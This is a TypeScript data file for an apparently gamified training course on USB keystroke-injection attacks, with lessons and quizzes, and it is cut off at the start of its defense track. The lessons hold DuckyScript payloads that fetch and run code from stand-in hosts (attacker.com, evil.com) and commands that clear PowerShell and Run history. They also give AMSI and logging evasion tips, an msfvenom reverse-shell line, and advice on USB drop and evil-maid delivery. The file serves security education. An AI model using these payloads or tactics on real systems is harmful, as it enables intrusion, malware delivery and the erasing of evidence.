export interface Lesson {
  id: string
  title: string
  trackId: string
  content: string
  xp: number
}

export interface Challenge {
  id: string
  trackId: string
  title: string
  description: string
  type: 'multiple-choice'
  questions: ChallengeQuestion[]
  xp: number
}

export interface ChallengeQuestion {
  prompt: string
  options?: string[]
  correctAnswer: string | number
  explanation: string
  hints: string[]
}

export interface Track {
  id: string
  name: string
  description: string
  icon: string
  lessons: Lesson[]
  challenge: Challenge
}

export interface Achievement {
  id: string
  name: string
  description: string
  icon: string
}

export const ACHIEVEMENTS: Achievement[] = [
  { id: 'FIRST_FLIGHT', name: 'First Flight', description: 'Complete your first lesson', icon: '🪶' },
  { id: 'SCRIPTER', name: 'Scripter', description: 'Complete USB Fundamentals track', icon: '📝' },
  { id: 'ENGINEER', name: 'Engineer', description: 'Complete Payload Engineering track', icon: '⚙️' },
  { id: 'INFILTRATOR', name: 'Infiltrator', description: 'Complete Advanced Delivery track', icon: '🎯' },
  { id: 'DEFENDER', name: 'Defender', description: 'Complete Defense & Detection track', icon: '🛡️' },
  { id: 'WINGS_COMPLETE', name: 'Wings Complete', description: 'Complete all learning tracks', icon: '🦅' },
  { id: 'CHALLENGE_HUNTER', name: 'Challenge Hunter', description: 'Complete 2 challenges', icon: '⚔️' },
  { id: 'PERFECT_FLIGHT', name: 'Perfect Flight', description: 'Complete all challenges', icon: '🏆' },
  { id: 'STREAK_3', name: '3-Day Streak', description: 'Maintain a 3-day learning streak', icon: '🔥' },
  { id: 'ICARUS_MASTER', name: 'Icarus Master', description: 'Reach level 10', icon: '☀️' },
]

export const TRACKS: Track[] = [
  {
    id: 'fundamentals',
    name: 'USB Attack Fundamentals',
    description: 'Learn the basics of USB HID attacks and the DuckyScript language',
    icon: '🪶',
    lessons: [
      {
        id: 'fund-1',
        title: 'What is a Rubber Ducky?',
        trackId: 'fundamentals',
        xp: 25,
        content: `# What is a Rubber Ducky?

A **USB Rubber Ducky** is a keystroke injection tool disguised as an ordinary USB flash drive. When plugged into a computer, it is recognized as a **Human Interface Device (HID)** — specifically, a keyboard.

## Why Does It Work?

Computers inherently trust keyboards. When you plug in a USB keyboard, the operating system immediately begins accepting input from it without requiring any special drivers or permissions. The Rubber Ducky exploits this trust by:

1. Enumerating as a standard USB HID keyboard
2. Injecting pre-programmed keystrokes at superhuman speed
3. Executing commands as if a legitimate user typed them

## Key Concepts

### HID (Human Interface Device)
The HID protocol is a USB standard for devices like keyboards, mice, and gamepads. Because keyboards are universally trusted:
- No driver installation required
- No user confirmation needed
- Works across all major operating systems
- Bypasses many endpoint security controls

### Keystroke Injection
Rather than storing files like a regular USB drive, the Rubber Ducky **types** commands into the target computer. It can:
- Open terminal/command prompt windows
- Execute PowerShell or bash commands
- Navigate GUI elements using keyboard shortcuts
- Type at speeds of 1000+ characters per second

### Attack Speed
A well-crafted payload can execute in **under 5 seconds** — faster than most users can react to remove the device.

## Common Rubber Ducky Devices

| Device | Description |
|--------|-------------|
| **USB Rubber Ducky** | Original Hak5 device, most popular |
| **Bash Bunny** | Multi-function attack platform |
| **O.MG Cable** | Attack cable disguised as charging cable |
| **Flipper Zero** | Multi-tool with BadUSB capability |
| **DigiSpark** | Budget Arduino-based alternative |
| **Teensy** | Programmable USB development board |

## Why Learn This?

Understanding USB attacks is critical for:
- **Red Team**: Testing physical security controls
- **Blue Team**: Knowing what to defend against
- **Security Awareness**: Training employees about USB risks
- **Incident Response**: Recognizing signs of keystroke injection attacks

---

**Important**: Always have written authorization before testing USB attacks. Unauthorized keystroke injection is illegal.`
      },
      {
        id: 'fund-2',
        title: 'DuckyScript Language',
        trackId: 'fundamentals',
        xp: 30,
        content: `# DuckyScript Language

DuckyScript is the scripting language used to program USB Rubber Ducky payloads. It's designed to be simple and human-readable, translating directly to keystroke sequences.

## Basic Commands

### STRING
Types a string of characters as if someone were typing on a keyboard.
\`\`\`
STRING Hello, World!
STRING powershell -WindowStyle Hidden
\`\`\`

### DELAY
Pauses execution for a specified number of milliseconds.
\`\`\`
DELAY 1000
DELAY 500
\`\`\`
**Why delays matter**: Without delays, commands may execute before the previous action completes (e.g., before a window opens).

### ENTER
Presses the Enter/Return key.
\`\`\`
ENTER
\`\`\`

### GUI / WINDOWS
Presses the Windows/Super key. Often combined with other keys.
\`\`\`
GUI r
GUI
\`\`\`
\`GUI r\` opens the Run dialog on Windows — one of the most common DuckyScript openers.

### REM
Adds a comment. These lines are ignored during execution.
\`\`\`
REM This is a comment
REM Author: ICARUS
\`\`\`

## Modifier Keys

### CTRL / CONTROL
\`\`\`
CTRL c
CTRL ALT DELETE
\`\`\`

### ALT
\`\`\`
ALT F4
ALT TAB
ALT y
\`\`\`
\`ALT y\` is commonly used to accept Windows UAC prompts.

### SHIFT
\`\`\`
SHIFT TAB
SHIFT INSERT
\`\`\`

## Special Keys

| Key | DuckyScript |
|-----|-------------|
| Enter | \`ENTER\` |
| Tab | \`TAB\` |
| Escape | \`ESCAPE\` or \`ESC\` |
| Space | \`SPACE\` |
| Backspace | \`BACKSPACE\` |
| Delete | \`DELETE\` or \`DEL\` |
| Arrow keys | \`UPARROW\`, \`DOWNARROW\`, \`LEFTARROW\`, \`RIGHTARROW\` |
| Caps Lock | \`CAPSLOCK\` |
| F1-F12 | \`F1\` through \`F12\` |

## Advanced Commands

### DEFAULT_DELAY / DEFAULTDELAY
Sets a delay between every subsequent command.
\`\`\`
DEFAULT_DELAY 100
\`\`\`

### REPEAT
Repeats the previous command N times.
\`\`\`
STRING a
REPEAT 10
\`\`\`
This types "a" 11 times total.

## Complete Example

\`\`\`
REM Open PowerShell on Windows
DELAY 1000
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 1000
STRING echo "Hello from Rubber Ducky!"
ENTER
DELAY 500
STRING exit
ENTER
\`\`\`

## Best Practices

1. **Always start with a DELAY** — gives the USB time to enumerate
2. **Use appropriate delays** — too fast and commands may fail
3. **Test thoroughly** — small timing differences can break payloads
4. **Include cleanup** — close windows, clear history when possible
5. **Comment your code** — use REM lines for documentation`
      },
      {
        id: 'fund-3',
        title: 'Attack Lifecycle',
        trackId: 'fundamentals',
        xp: 30,
        content: `# USB Attack Lifecycle

Every USB HID attack follows a predictable lifecycle. Understanding each phase is critical for both executing and defending against these attacks.

## Phase 1: Reconnaissance

Before crafting a payload, you need intelligence about the target:

### What to Gather
- **Operating System**: Windows, macOS, or Linux? Which version?
- **Security Software**: What AV/EDR is running? Is it managed?
- **Keyboard Layout**: US, UK, German? Layout affects special characters
- **Physical Access**: How long will you have with the device?
- **User Privileges**: Is the target user an admin?
- **Network Environment**: Is it domain-joined? What's the proxy setup?

### Recon Methods
- **Visual inspection** — observe the screen, desktop icons, OS version
- **Social engineering** — ask about their setup, IT policies
- **Prior OSINT** — job postings mentioning tech stack, LinkedIn profiles
- **Physical observation** — monitor badge policies, desk setups

## Phase 2: Payload Crafting

Design your DuckyScript payload based on recon findings:

### Key Considerations
1. **Speed vs. Stealth**: Faster execution = less time to detect, but too fast causes errors
2. **Error Handling**: What if a window doesn't open? Add fallback delays
3. **OS-Specific Commands**: PowerShell for Windows, Terminal for macOS
4. **Privilege Level**: Does your payload need admin? Plan for UAC
5. **Cleanup**: Remove evidence, close windows, clear command history

### Payload Structure Template
\`\`\`
REM [Payload Name]
REM [Description]
REM [Target OS & Version]

REM Phase 1: Initial Access
DELAY 1000
GUI r
DELAY 500

REM Phase 2: Command Execution
STRING [commands]
ENTER
DELAY [appropriate wait]

REM Phase 3: Cleanup
STRING exit
ENTER
\`\`\`

## Phase 3: Delivery

The physical delivery of the USB device:

### Delivery Methods
- **Drop Attack**: Leave USB drives in parking lots, lobbies, or restrooms
- **Direct Insertion**: Plug in during a meeting, while target is away from desk
- **Social Engineering**: "Hey, can you print this for me?" (hands over Rubber Ducky)
- **Evil Maid**: Access hotel room, office after hours
- **Supply Chain**: Intercept and modify USB devices before delivery

### Timing Considerations
- Lock screen bypass timing
- Window opening delays
- Network connectivity waits
- UAC prompt handling

## Phase 4: Execution

The payload runs automatically once the device is plugged in:

- Device enumerates as keyboard (0.5-2 seconds)
- Initial delay allows OS to fully recognize device
- Commands execute sequentially
- Total execution typically 3-30 seconds

## Phase 5: Cleanup

### What to Clean
- Close any opened windows
- Clear PowerShell/CMD history
- Delete downloaded tools
- Restore modified settings
- Remove USB device

### Anti-Forensics
\`\`\`
REM Clear PowerShell history
STRING Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
ENTER
REM Clear Run dialog history
STRING reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU" /f
ENTER
\`\`\`

## Timeline of a Typical Attack

| Time | Action |
|------|--------|
| 0.0s | Insert USB device |
| 0.5s | Device enumerates as HID |
| 1.5s | Initial delay completes |
| 2.0s | GUI+R opens Run dialog |
| 2.5s | Type command |
| 3.0s | Press Enter |
| 3.5s | Command begins execution |
| 8.0s | Payload completes |
| 8.5s | Cleanup begins |
| 10.0s | Remove USB device |

---

**Remember**: The best payload in the world fails if the physical delivery is noticed. Social engineering and physical security awareness are just as important as the technical payload.`
      }
    ],
    challenge: {
      id: 'fund-challenge',
      trackId: 'fundamentals',
      title: 'Write the Script',
      description: 'Given a scenario, select the correct DuckyScript commands',
      type: 'multiple-choice',
      xp: 50,
      questions: [
        {
          prompt: 'You need to open the Windows Run dialog. Which DuckyScript command do you use?',
          options: ['STRING Run', 'GUI r', 'CTRL r', 'ALT F2'],
          correctAnswer: 1,
          explanation: 'GUI r (or WINDOWS r) opens the Run dialog on Windows. The GUI key is the Windows key.',
          hints: ['The GUI key is also known as the Windows key', 'The Run dialog shortcut is Win+R']
        },
        {
          prompt: 'What is the correct order for opening PowerShell via the Run dialog?',
          options: [
            'STRING powershell → ENTER → GUI r',
            'GUI r → STRING powershell → ENTER',
            'ENTER → GUI r → STRING powershell',
            'GUI r → ENTER → STRING powershell'
          ],
          correctAnswer: 1,
          explanation: 'First open Run (GUI r), then type the command (STRING powershell), then press ENTER to execute.',
          hints: ['You need to open the dialog before you can type in it', 'Think about the logical order of user actions']
        },
        {
          prompt: 'Why should you always start a DuckyScript payload with a DELAY command?',
          options: [
            'To confuse antivirus software',
            'To give the USB device time to enumerate as a keyboard',
            'To wait for the user to look away',
            'DuckyScript requires it syntactically'
          ],
          correctAnswer: 1,
          explanation: 'USB devices need time (typically 0.5-2 seconds) to enumerate and be recognized by the OS. Without this delay, keystrokes may be lost.',
          hints: ['Think about what happens when you plug in ANY USB device', 'The OS needs time to recognize the new hardware']
        },
        {
          prompt: 'Which command adds a comment in DuckyScript?',
          options: ['// comment', '# comment', 'REM comment', '/* comment */'],
          correctAnswer: 2,
          explanation: 'REM (short for "remark") is used for comments in DuckyScript. Lines starting with REM are ignored during execution.',
          hints: ['This is similar to the comment syntax in batch files', 'It stands for "remark"']
        },
        {
          prompt: 'What does DEFAULT_DELAY 100 do?',
          options: [
            'Waits 100ms at the start of the script',
            'Adds a 100ms delay between every subsequent command',
            'Sets the minimum delay for all DELAY commands',
            'Waits 100ms at the end of the script'
          ],
          correctAnswer: 1,
          explanation: 'DEFAULT_DELAY (or DEFAULTDELAY) sets a delay that is automatically inserted between every subsequent command in the script.',
          hints: ['It affects ALL commands that come after it', 'Think of it as a global timing setting']
        }
      ]
    }
  },
  {
    id: 'engineering',
    name: 'Payload Engineering',
    description: 'Master the art of designing reliable, stealthy USB payloads',
    icon: '⚙️',
    lessons: [
      {
        id: 'eng-1',
        title: 'Payload Design Principles',
        trackId: 'engineering',
        xp: 30,
        content: `# Payload Design Principles

Effective USB payloads balance four competing priorities: **speed**, **stealth**, **reliability**, and **error handling**.

## Speed

### Why Speed Matters
- Less time plugged in = less chance of detection
- Users may notice and remove the device
- Security cameras may capture the insertion
- USB monitoring tools may alert after a threshold

### Speed Optimization
\`\`\`
REM SLOW (bad)
DELAY 2000
GUI r
DELAY 2000
STRING cmd
DELAY 2000
ENTER

REM FAST (better)
DELAY 800
GUI r
DELAY 400
STRING cmd
ENTER
\`\`\`

**Rule of thumb**: Use the minimum delay that reliably works. Test on similar hardware.

## Stealth

### Visual Stealth
- Use \`-WindowStyle Hidden\` for PowerShell
- Minimize and close windows quickly
- Match the target's normal activity patterns

\`\`\`
REM Stealthy PowerShell execution
STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "..."
\`\`\`

### Behavioral Stealth
- Avoid triggering UAC prompts when possible
- Use living-off-the-land binaries (LOLBins)
- Minimize network traffic patterns
- Time execution during normal activity

## Reliability

### Common Failure Points
1. **Timing issues**: Delays too short for the target hardware
2. **Keyboard layout mismatches**: Special characters differ between layouts
3. **Missing prerequisites**: Required software not installed
4. **Permission issues**: UAC blocks, restricted PowerShell
5. **Window focus**: Wrong window receives keystrokes

### Building Reliable Payloads
- Test on identical OS version and hardware
- Add slightly longer delays for safety
- Include fallback mechanisms
- Verify window focus before typing commands

## Error Handling

### Defensive Coding Patterns
\`\`\`
REM Try CMD first, fallback to PowerShell
GUI r
DELAY 500
STRING cmd /c "powershell -WindowStyle Hidden ..."
ENTER
\`\`\`

### Timeout Handling
Always plan for commands that might hang:
\`\`\`
REM Set a maximum execution time
STRING Start-Process powershell -ArgumentList '-Command "Start-Sleep 10; exit"'
\`\`\`

## The Golden Rules

1. **Test, test, test** — never deploy an untested payload
2. **Keep it simple** — complex payloads have more failure points
3. **Know your target** — one-size-fits-all payloads are unreliable
4. **Plan for failure** — what happens if step 3 fails?
5. **Clean up after yourself** — leave minimal forensic artifacts`
      },
      {
        id: 'eng-2',
        title: 'OS-Specific Techniques',
        trackId: 'engineering',
        xp: 30,
        content: `# OS-Specific Techniques

Each operating system has unique keyboard shortcuts, terminal access methods, and security controls that affect payload design.

## Windows

### Opening a Terminal
\`\`\`
REM Method 1: Run Dialog (fastest)
GUI r
DELAY 500
STRING powershell
ENTER

REM Method 2: Search (more reliable)
GUI
DELAY 800
STRING powershell
DELAY 500
ENTER

REM Method 3: Win+X menu (admin)
GUI x
DELAY 300
STRING a
\`\`\`

### Key Windows Shortcuts
| Shortcut | Action |
|----------|--------|
| GUI r | Open Run dialog |
| GUI x | Power user menu |
| GUI e | Open File Explorer |
| CTRL SHIFT ESCAPE | Task Manager |
| ALT F4 | Close window |
| GUI l | Lock workstation |

### PowerShell Flags
- \`-WindowStyle Hidden\` — no visible window
- \`-ExecutionPolicy Bypass\` — ignore script restrictions
- \`-NoProfile\` — skip profile scripts (faster)
- \`-EncodedCommand\` — base64 encoded command

## macOS

### Opening Terminal
\`\`\`
REM Method 1: Spotlight (most reliable)
GUI SPACE
DELAY 800
STRING Terminal
DELAY 500
ENTER

REM Method 2: Launchpad
F4
DELAY 500
STRING Terminal
DELAY 300
ENTER
\`\`\`

### Key macOS Differences
- **Command key** = GUI in DuckyScript
- No Run dialog — use Spotlight
- Different file paths (/Users/ not C:\\Users\\)
- Terminal uses bash/zsh by default
- Gatekeeper may block downloaded executables

## Linux

### Opening Terminal
\`\`\`
REM GNOME
CTRL ALT t
DELAY 1000

REM KDE
CTRL ALT t
DELAY 1000

REM Generic (if shortcut fails)
GUI
DELAY 500
STRING terminal
DELAY 300
ENTER
\`\`\`

### Key Linux Considerations
- Root access varies (sudo requirements)
- Multiple desktop environments with different shortcuts
- Terminal emulator varies (gnome-terminal, konsole, xterm)
- Package managers differ (apt, yum, pacman)
- Firewall configurations vary widely

## Cross-Platform Payloads

Building payloads that work across operating systems is challenging but possible:

\`\`\`
REM Cross-platform approach:
REM 1. Detect OS through timing behavior
REM 2. Use common shortcuts where possible
REM 3. Provide OS-specific branches

REM Try Windows first
GUI r
DELAY 500
STRING powershell -Command "echo Windows detected"
ENTER
\`\`\`

The most reliable approach is to **create separate payloads per OS** rather than trying to build one universal payload.`
      },
      {
        id: 'eng-3',
        title: 'Evasion Techniques',
        trackId: 'engineering',
        xp: 35,
        content: `# Evasion Techniques

Modern security tools can detect and block USB HID attacks. Understanding evasion techniques is essential for both attackers and defenders.

## Timing-Based Evasion

### Keystroke Jitter
Security tools may flag uniform typing speeds (machines type consistently, humans don't):

\`\`\`
REM Without jitter (suspicious)
STRING whoami
ENTER

REM With jitter (more natural)
STRING w
DELAY 67
STRING h
DELAY 120
STRING o
DELAY 45
STRING a
DELAY 89
STRING m
DELAY 134
STRING i
ENTER
\`\`\`

### Human-Like Delays
Add small random delays between keystrokes to mimic human typing patterns.

## AMSI Bypass

The **Antimalware Scan Interface (AMSI)** scans PowerShell commands before execution. Bypassing AMSI is often the first step:

\`\`\`
REM AMSI bypass techniques:
REM 1. String concatenation
STRING $a='Am'; $b='siUtils'
ENTER
REM 2. Reflection-based patching
REM 3. Base64 encoding
\`\`\`

## Living Off the Land (LOLBins)

Use built-in system tools instead of downloading malware:

### Windows LOLBins
- **certutil.exe** — download files
- **mshta.exe** — execute HTML applications
- **regsvr32.exe** — execute DLLs/scripts
- **wmic.exe** — system management
- **bitsadmin.exe** — file transfers

\`\`\`
REM Download using certutil (built-in)
STRING certutil -urlcache -split -f https://attacker.com/payload.exe %TEMP%\\payload.exe
\`\`\`

## Obfuscation Techniques

### String Breaking
Split long commands across multiple lines to avoid signature detection.

### Base64 Encoding
Encode entire PowerShell commands in Base64:
\`\`\`
STRING powershell -EncodedCommand <base64_string>
\`\`\`

### Environment Variable Substitution
Use environment variables to construct commands:
\`\`\`
STRING set a=power& set b=shell& %a%%b% -Command "..."
\`\`\`

## Endpoint Security Bypass

### USB Device Control
Some organizations use USB device whitelisting. Counters include:
- Devices that enumerate as legitimate keyboard models
- Multi-function devices that appear as regular USB drives first

### PowerShell Logging
Avoid detection by:
- Using cmd.exe instead of PowerShell where possible
- Disabling logging as first command
- Using encoded commands
- Leveraging alternative scripting (VBS, JScript)

## Detection & Indicators

Understanding what defenders look for helps craft stealthier payloads:
- **Typing speed anomalies** — machines type too fast
- **Suspicious command sequences** — Run dialog → PowerShell → network activity
- **USB device events** — new HID device enumeration
- **Process creation logs** — unusual parent-child process relationships
- **Network connections** — outbound connections after USB insertion`
      }
    ],
    challenge: {
      id: 'eng-challenge',
      trackId: 'engineering',
      title: 'Spot the Bug',
      description: 'Find the error in the given DuckyScript payloads',
      type: 'multiple-choice',
      xp: 50,
      questions: [
        {
          prompt: 'What is wrong with this payload?\n\nGUI r\nSTRING powershell\nENTER\nSTRING whoami\nENTER',
          options: [
            'The ENTER command is invalid',
            'Missing initial DELAY — device needs time to enumerate',
            'STRING cannot contain spaces',
            'GUI r only works on macOS'
          ],
          correctAnswer: 1,
          explanation: 'Every payload should start with a DELAY (typically 500-1000ms) to give the USB device time to enumerate as a keyboard.',
          hints: ['What happens immediately after plugging in a USB device?', 'The OS needs time to recognize the keyboard']
        },
        {
          prompt: 'Why might this payload fail?\n\nDELAY 1000\nGUI r\nDELAY 100\nSTRING powershell\nENTER',
          options: [
            'DELAY 1000 is too long',
            'GUI r is wrong syntax',
            'DELAY 100 after GUI r is too short — Run dialog may not be open yet',
            'ENTER should come before STRING'
          ],
          correctAnswer: 2,
          explanation: 'After pressing GUI+R, the Run dialog needs time to open (typically 300-500ms). A 100ms delay is often too short.',
          hints: ['Think about how long the Run dialog takes to appear', 'Different computers have different response times']
        },
        {
          prompt: 'What security issue exists in this payload?\n\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell\nENTER\nDELAY 1000\nSTRING Invoke-WebRequest -Uri "https://evil.com/malware.exe" -OutFile malware.exe\nENTER',
          options: [
            'The URL is too long for DuckyScript',
            'PowerShell window is visible — should use -WindowStyle Hidden',
            'Invoke-WebRequest is not a valid command',
            'The file extension is wrong'
          ],
          correctAnswer: 1,
          explanation: 'Opening PowerShell without -WindowStyle Hidden leaves the window visible. Anyone watching the screen would see the malicious commands being typed.',
          hints: ['Think about what the user would SEE on their screen', 'Stealth is important in payload design']
        },
        {
          prompt: 'What is the purpose of "ALT y" in a Windows payload?',
          options: [
            'Copies selected text',
            'Opens the Yes/No dialog',
            'Clicks "Yes" on a UAC (User Account Control) prompt',
            'Switches to the previous window'
          ],
          correctAnswer: 2,
          explanation: 'ALT y clicks the "Yes" button on Windows UAC prompts, which appear when a program requests elevated (admin) privileges.',
          hints: ['UAC stands for User Account Control', 'Think about what happens when you try to run something as administrator']
        },
        {
          prompt: 'Which technique makes a payload harder for security tools to detect?',
          options: [
            'Typing commands as fast as possible',
            'Adding random delays between keystrokes to simulate human typing',
            'Using ALL CAPS in commands',
            'Adding many REM comments explaining each step'
          ],
          correctAnswer: 1,
          explanation: 'Adding random delays (jitter) between keystrokes makes the typing pattern look more human-like, as machines typically type at a perfectly consistent speed.',
          hints: ['How does a human type vs. a machine?', 'Security tools look for patterns that seem "too perfect"']
        }
      ]
    }
  },
  {
    id: 'advanced',
    name: 'Advanced Delivery',
    description: 'Explore advanced USB attack tools, multi-stage payloads, and physical delivery',
    icon: '🎯',
    lessons: [
      {
        id: 'adv-1',
        title: 'Beyond Rubber Ducky',
        trackId: 'advanced',
        xp: 30,
        content: `# Beyond Rubber Ducky

The USB Rubber Ducky was the pioneer, but the ecosystem of USB attack tools has expanded significantly.

## Bash Bunny

The **Bash Bunny** by Hak5 is a multi-function USB attack platform:

- **Multiple attack modes**: HID keyboard, USB storage, Ethernet adapter
- **Linux-based**: Full Bash scripting environment
- **Combined attacks**: Simultaneous HID + Ethernet for network-based attacks
- **Payload switching**: Physical switch for multiple payloads

### Key Advantages
- Can exfiltrate data to built-in storage
- Network attacks via USB Ethernet emulation
- More complex multi-stage payloads
- LED indicators for attack status

## O.MG Cable

A **malicious USB cable** that looks identical to a regular charging cable:

- Keystroke injection via hidden implant
- WiFi-enabled for remote command execution
- Self-destruct capability
- Geofencing support
- Virtually undetectable visually

### Why It's Dangerous
- Users never suspect a charging cable
- Can be swapped with existing cables
- Remote triggering eliminates physical presence requirement

## Flipper Zero

A **multi-tool for penetration testers** with BadUSB functionality:

- USB HID keystroke injection (BadUSB)
- RFID/NFC reader and emulator
- Sub-GHz radio transceiver
- Infrared transmitter
- GPIO pins for hardware hacking
- Runs DuckyScript payloads

## DIY Arduino Solutions

### Digispark ATtiny85
- **Cost**: ~$2 per device
- **Size**: Thumbnail-sized
- **Capability**: Basic HID attacks
- Uses Arduino IDE for programming

### Arduino Leonardo / Pro Micro
- Full HID keyboard emulation
- More GPIO pins for complex setups
- Can combine with WiFi/BT modules

### ESP32-S2/S3
- Native USB support
- WiFi and Bluetooth built-in
- Can create WiFi-triggered payloads
- Very low cost ($5-10)

## Comparison Matrix

| Feature | Rubber Ducky | Bash Bunny | O.MG Cable | Flipper Zero | DIY Arduino |
|---------|-------------|------------|------------|-------------|-------------|
| Cost | $80 | $100 | $120+ | $170 | $2-15 |
| Stealth | Good | Moderate | Excellent | Moderate | Variable |
| Complexity | Simple | Advanced | Moderate | Moderate | Simple |
| Network | No | Yes | Yes (WiFi) | No | With module |
| Remote | No | No | Yes | BT | With module |`
      },
      {
        id: 'adv-2',
        title: 'Multi-Stage Payloads',
        trackId: 'advanced',
        xp: 35,
        content: `# Multi-Stage Payloads

Complex attacks often use multi-stage payloads where the initial USB injection is just the first step.

## Stage Architecture

### Stage 0: Initial Access (USB Injection)
The DuckyScript payload runs and establishes a foothold:
\`\`\`
REM Stage 0: Dropper
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString('https://attacker.com/stage1.ps1')"
ENTER
\`\`\`

### Stage 1: Stager
Downloaded by Stage 0, performs initial recon and downloads the main payload:
- System enumeration
- AV/EDR detection
- Connectivity check
- Download and execute Stage 2

### Stage 2: Main Payload
The full capability tool:
- Reverse shell / C2 beacon
- Credential harvesting
- Persistence installation
- Data collection

### Stage 3: Exfiltration
Data leaves the target:
- DNS exfiltration
- HTTP/HTTPS upload
- Cloud storage upload
- Email

## C2 Integration

### Metasploit Framework
\`\`\`
REM Generate staged payload
REM msfvenom -p windows/x64/meterpreter_reverse_https
REM   LHOST=attacker.com LPORT=443
REM   -f psh -o payload.ps1
\`\`\`

### Cobalt Strike
- Malleable C2 profiles for traffic blending
- Beacon payloads with sleep/jitter
- Lateral movement capability
- Integrated post-exploitation

### Sliver / Havoc
Open-source C2 alternatives with modern features.

## Staging Techniques

### In-Memory Execution
Never write to disk — execute entirely in memory:
\`\`\`
REM Download and execute in memory
STRING powershell -ExecutionPolicy Bypass -Command "IEX(IWR 'https://attacker.com/payload.ps1')"
\`\`\`

### Encrypted Payloads
Encrypt the payload to avoid network inspection:
1. Stage 0 downloads encrypted blob
2. Decryption key embedded in stager
3. Decrypted payload executed in memory

### Conditional Execution
Only proceed if conditions are met:
\`\`\`
REM Check if we're on the right target
STRING powershell -Command "if($env:USERDOMAIN -eq 'TARGETCORP'){IEX(...)}"
\`\`\`

## Common Pitfalls

1. **Single point of failure**: If Stage 0 fails, everything fails
2. **Network dependencies**: What if the target has no internet?
3. **AV detection**: Each stage is a detection opportunity
4. **Timing**: Stages must complete before the next begins
5. **Attribution**: More stages = more forensic artifacts`
      },
      {
        id: 'adv-3',
        title: 'Physical Social Engineering',
        trackId: 'advanced',
        xp: 35,
        content: `# Physical Social Engineering

Technical payloads are useless without physical access. This lesson covers the human element of USB attacks.

## Drop Attacks

Leaving USB devices in strategic locations for targets to find and plug in:

### Effective Drop Locations
- **Parking lots** — near the target building entrance
- **Lobbies and reception areas** — on tables, counters
- **Conference rooms** — under tables, near outlets
- **Restrooms** — on counters, near sinks
- **Cafeterias** — on tables, near food areas

### Social Engineering the Drop
Label the USB with enticing text:
- "Confidential — Q4 Financials"
- "Employee Salary Data 2024"
- "Password Reset Tool"
- Company logo sticker
- Executive's name written on it

### Success Rate
Studies show **45-98%** of dropped USB drives get plugged in, depending on the study and location.

## Evil Maid Attacks

Gaining physical access to an unattended device:

### Hotel Room Attacks
- Housekeeping cover identity
- Target devices left in rooms
- Brief 30-60 second window needed
- Plant persistent access via USB

### Office After-Hours
- Cleaning crew access
- Weekend/holiday timing
- Shared workspace exploitation
- Meeting room devices

## Supply Chain Attacks

Intercepting USB devices before they reach the target:

### Methods
- Modify USB drives before corporate distribution
- Swap USB peripherals (keyboards, mice) with modified versions
- Intercept online orders and modify devices
- Plant modified charging cables

### Notable Examples
- NSA's COTTONMOUTH implants (leaked by Snowden)
- Modified charging stations at conferences
- Compromised promotional USB drives at trade shows

## Physical Security Bypasses

### Tailgating
Following authorized personnel through secure doors.

### Pretexting
Creating a believable cover story:
- IT support technician
- Vendor or contractor
- New employee
- Delivery person

### Timing
- Early morning (fewer people, less scrutiny)
- Lunch break (offices may be empty)
- After hours (cleaning crew access)
- During events (chaos provides cover)

## Defensive Measures

Understanding these attacks helps build defenses:
- **USB port disabling** via Group Policy
- **USB device whitelisting** (only approved devices)
- **Physical USB port locks** (mechanical blockers)
- **Security awareness training** — teach employees about USB risks
- **Clean desk policies** — lock devices when leaving
- **Endpoint monitoring** — alert on new HID device connections
- **Camera monitoring** — review physical access points`
      }
    ],
    challenge: {
      id: 'adv-challenge',
      trackId: 'advanced',
      title: 'Design the Attack',
      description: 'Plan a complete USB attack for a given scenario',
      type: 'multiple-choice',
      xp: 50,
      questions: [
        {
          prompt: 'You need to deploy a USB payload in a corporate office. The target uses Windows 11 with Defender enabled. Which approach is best?',
          options: [
            'Use a standard USB flash drive with an autorun payload',
            'Use a Rubber Ducky with a payload that disables Defender first, then downloads tools',
            'Email the payload instead — USB attacks are outdated',
            'Use a USB flash drive containing a PDF with an embedded macro'
          ],
          correctAnswer: 1,
          explanation: 'A Rubber Ducky with a proper payload that handles Defender is the most effective approach. Autorun is disabled by default on modern Windows, and USB drives cannot execute code automatically.',
          hints: ['Autorun has been disabled on Windows for many years', 'HID devices bypass USB storage restrictions']
        },
        {
          prompt: 'Which USB device would be LEAST suspicious when left on a conference room table?',
          options: [
            'A large black USB device with "Hak5" printed on it',
            'A tiny USB drive with the company logo on it',
            'A Flipper Zero with its screen visible',
            'An Arduino with exposed wires'
          ],
          correctAnswer: 1,
          explanation: 'A small, branded USB drive looks like a normal promotional item or employee device. It blends in naturally with an office environment.',
          hints: ['Think about what looks "normal" in an office', 'Social engineering is about blending in']
        },
        {
          prompt: 'Your payload needs to work on a locked Windows workstation. What is the correct approach?',
          options: [
            'DuckyScript can bypass the lock screen automatically',
            'Use a Bash Bunny in Ethernet mode to perform a network attack instead',
            'Wait for the user to unlock it — there is no reliable lock screen bypass via HID',
            'Type the password really fast'
          ],
          correctAnswer: 2,
          explanation: 'HID keyboards cannot bypass a locked screen without knowing the password. The best approach is to wait for an unlocked workstation or use a network-based attack (like a Bash Bunny in Ethernet mode).',
          hints: ['Can you type on a locked computer?', 'The lock screen blocks keyboard input to applications']
        },
        {
          prompt: 'What is the main advantage of an O.MG Cable over a USB Rubber Ducky?',
          options: [
            'It is faster at typing',
            'It supports more DuckyScript commands',
            'It looks like a normal charging cable and can be triggered remotely via WiFi',
            'It is cheaper'
          ],
          correctAnswer: 2,
          explanation: 'The O.MG Cable is disguised as an ordinary USB/Lightning cable, making it virtually undetectable visually. Its WiFi capability allows remote triggering without physical proximity.',
          hints: ['Think about physical appearance and stealth', 'Consider what makes it unique compared to other tools']
        },
        {
          prompt: 'In a multi-stage payload, why is in-memory execution preferred over writing files to disk?',
          options: [
            'It is faster to execute',
            'It avoids leaving forensic artifacts and is harder for AV to scan',
            'Disk space might be full',
            'DuckyScript cannot write to disk'
          ],
          correctAnswer: 1,
          explanation: 'In-memory execution avoids writing files to disk, which means AV cannot scan the payload file and forensic analysis is much harder since the payload disappears when the process ends.',
          hints: ['Think about what antivirus software scans', 'Consider what happens to evidence when a process ends']
        }
      ]
    }
  },
  {
    id: 'defense',
    name: 'Defense & Detection',
    description: 'Learn to detect, prevent, and respond to USB HID attacks',
